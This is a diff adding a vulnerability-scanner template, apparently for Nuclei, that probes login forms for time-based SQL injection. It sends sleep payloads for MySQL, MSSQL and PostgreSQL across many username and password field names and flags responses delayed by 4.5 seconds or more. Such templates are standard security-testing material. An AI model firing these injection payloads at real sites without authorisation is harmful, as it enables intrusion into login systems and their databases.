@@ -1,0 +1,75 @@
+id: sqli-timebased
+info:
+  name: SQLi - Time-Based SQLi on Login Forms
+  author: Jun Min
+  severity: critical
+  description: Detects time-based SQL injection on login forms by injecting sleep payloads and measuring delayed server responses.
+  tags:
+    - timebased
+    - sqli
+    - login
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    
+    payloads:
+      user_param:
+        - username
+        - user
+        - email
+        - email_address
+        - login
+        - userid
+        - uid
+        - uname
+
+      pass_param:
+        - password
+        - pwd
+        - pass
+        - user_pass
+        - passwd
+        - login_password
+
+      delay_payload:
+        - "' OR IF(email='alice@example.com', SLEEP(5), 0) -- -"
+        - "' OR SLEEP(5)-- -"
+        - "\" OR SLEEP(5)-- -"
+        - "'; WAITFOR DELAY '0:0:5'--"
+        - "'; SELECT pg_sleep(5)--"
+        - "1) OR SLEEP(5)--"
+        - "') OR SLEEP(5)-- -"
+
+      submit_param:
+        - login
+        - Login
+        - LOGIN
+
+    attack: clusterbomb 
+
+    body: "{{user_param}}=test{{delay_payload}}&{{pass_param}}=abc123&submit={{submit_param}}"
+
+    threads: 6
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+
+      - type: dsl #Domain-Specific Language
+        name: time-delay
+        dsl:
+          - "duration >= 4.5"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: dsl
+        name: response_time
+        dsl:
+          - "'Response took ' + to_string(duration) + ' seconds'"
